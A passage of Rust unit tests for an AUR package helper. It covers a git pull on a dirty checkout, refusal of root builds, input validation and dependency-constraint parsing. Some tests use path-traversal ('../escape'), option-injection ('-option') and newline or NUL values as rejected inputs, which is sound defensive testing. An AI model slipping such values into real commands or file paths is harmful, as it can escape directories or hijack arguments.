            std::process::Command::new("git")
                .args(args)
                .output()
                .unwrap()
        };
        assert!(
            git(&["init".as_ref(), "--bare".as_ref(), remote.as_os_str()])
                .status
                .success()
        );
        assert!(git(&["init".as_ref(), seed.as_os_str()]).status.success());
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "config".as_ref(),
                "user.email".as_ref(),
                "test@example.invalid".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "config".as_ref(),
                "user.name".as_ref(),
                "OMG test".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "config".as_ref(),
                "commit.gpgsign".as_ref(),
                "false".as_ref(),
            ])
            .status
            .success()
        );
        std::fs::write(seed.join("PKGBUILD"), "pkgver=1\n").unwrap();
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "add".as_ref(),
                "PKGBUILD".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "commit".as_ref(),
                "-m".as_ref(),
                "initial".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "remote".as_ref(),
                "add".as_ref(),
                "origin".as_ref(),
                remote.as_os_str(),
            ])
            .status
            .success()
        );
        assert!(
            git(&[
                "-C".as_ref(),
                seed.as_os_str(),
                "push".as_ref(),
                "-u".as_ref(),
                "origin".as_ref(),
                "HEAD".as_ref(),
            ])
            .status
            .success()
        );
        assert!(
            git(&["clone".as_ref(), remote.as_os_str(), checkout.as_os_str(),])
                .status
                .success()
        );
        std::fs::write(checkout.join("PKGBUILD"), "pkgver=2\n").unwrap();

        let mut pull_args: Vec<&std::ffi::OsStr> = vec!["-C".as_ref(), checkout.as_os_str()];
        pull_args.extend(
            AUR_GIT_PULL_ARGS
                .iter()
                .map(|arg| std::ffi::OsStr::new(*arg)),
        );
        let pull = git(&pull_args);

        assert!(
            pull.status.success(),
            "dirty VCS PKGBUILDs must not inherit pull.rebase=true: {}",
            String::from_utf8_lossy(&pull.stderr)
        );
    }

    #[test]
    fn aur_builds_reject_root_and_accept_an_unprivileged_user() {
        require_unprivileged_builder("example", false).expect("regular user");
        let error = require_unprivileged_builder("example", true)
            .expect_err("root builds must be rejected");
        assert!(error.to_string().contains("must not be built as root"));
        assert!(error.to_string().contains("omg install example"));
    }

    #[test]
    fn resolved_package_base_rejects_untrusted_path_and_option_syntax() {
        assert_eq!(
            AurClient::validated_package_base("output", Some("valid-base")).unwrap(),
            "valid-base"
        );
        assert!(AurClient::validated_package_base("output", Some("../escape")).is_err());
        assert!(AurClient::validated_package_base("output", Some("-option")).is_err());
    }

    #[test]
    fn index_entry_names_are_validated_against_expected_packages() {
        validate_index_entry_name("valid-package", None).expect("valid index package");
        assert!(validate_index_entry_name("../escape", None).is_err());
        let error = validate_index_entry_name("different", Some("expected"))
            .expect_err("an exact lookup must reject a different package");
        assert!(error.to_string().contains("unexpected package 'different'"));
    }

    #[test]
    fn search_query_validation_is_shared_by_all_aur_search_paths() {
        assert!(validate_search_query("normal package").is_ok());
        assert!(validate_search_query(&"x".repeat(AUR_SEARCH_MAX_BYTES)).is_ok());
        assert!(validate_search_query(&"x".repeat(AUR_SEARCH_MAX_BYTES + 1)).is_err());
        assert!(validate_search_query("").is_err());
        assert!(validate_search_query("   ").is_err());
        assert!(validate_search_query("x").is_err());
        assert!(validate_search_query("package\nname").is_err());
        assert!(validate_search_query("package\0name").is_err());
    }

    #[test]
    fn test_dependency_name_parses_constraints() {
        assert_eq!(dependency_name("simdutf-git"), "simdutf-git");
        assert_eq!(dependency_name("fast_float>=7.0"), "fast_float");
        assert_eq!(dependency_name("foo<2.0"), "foo");
        assert_eq!(dependency_name("bar=1.2.3"), "bar");
    }
}
